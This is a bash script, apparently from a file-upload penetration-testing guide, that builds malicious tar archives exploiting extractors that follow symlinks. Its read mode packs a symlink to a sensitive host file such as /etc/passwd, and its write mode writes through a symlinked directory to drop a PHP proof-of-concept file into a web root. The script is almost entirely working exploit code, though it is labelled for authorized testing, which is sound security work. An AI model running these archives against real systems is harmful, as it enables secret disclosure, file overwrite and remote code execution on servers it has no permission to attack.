#!/usr/bin/env bash
# make_symlink_tar.sh — build a tar containing a SYMLINK entry (FILE_UPLOAD_TESTING_GUIDE.md §17.2).
# AUTHORIZED testing only. If the target extractor follows symlinks, it can read or overwrite host files.
#
# READ variant : the archive contains a symlink "link" -> a sensitive file. If the app later SERVES "link"
#                back to you, you read that file's contents (secret disclosure).
# WRITE variant: a symlink to a directory, then a second entry that writes THROUGH it, overwrites a file
#                the app serves/trusts (→ stored XSS / RCE).
#
# Usage:
#   bash make_symlink_tar.sh read  /etc/passwd            evil.tar
#   bash make_symlink_tar.sh write /var/www/html  poc.php evil.tar
set -eu

mode="${1:-read}"
out="${!#}"                      # last arg = output tar
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
cd "$tmp"

case "$mode" in
  read)
    target="${2:?target file, e.g. /etc/passwd}"
    ln -s "$target" link
    # store the symlink ENTRY, not its target: do NOT use -h/--dereference (that archives the target's
    # CONTENT, defeating the read attack — and fails under `set -e` if the target isn't locally readable).
    tar -cf "$OLDPWD/$out" link
    echo "[+] $out contains symlink 'link' -> $target"
    echo "    Upload it; if the app extracts AND later serves 'link', you read $target."
    ;;
  write)
    dir="${2:?target dir, e.g. /var/www/html}"
    fname="${3:?filename to drop, e.g. poc.php}"
    ln -s "$dir" d
    printf '<?php echo "RCE-POC-".php_uname(); ?>\n' > payload
    # entry order matters: the symlink dir first, then a write through it:
    tar -cf "$OLDPWD/$out" d
    tar -rf "$OLDPWD/$out" --transform "s|payload|d/$fname|" payload
    echo "[+] $out: symlink 'd' -> $dir, then writes d/$fname through it on extraction → $dir/$fname"
    echo "    Works only if the extractor follows the symlink dir (no canonical-path check)."
    ;;
  *) echo "usage: $0 read <file> <out.tar>  |  write <dir> <fname> <out.tar>"; exit 1 ;;
esac

echo "[!] AUTHORIZED testing only. Use a BENIGN target/marker. Delete artifacts after (guide §26)."
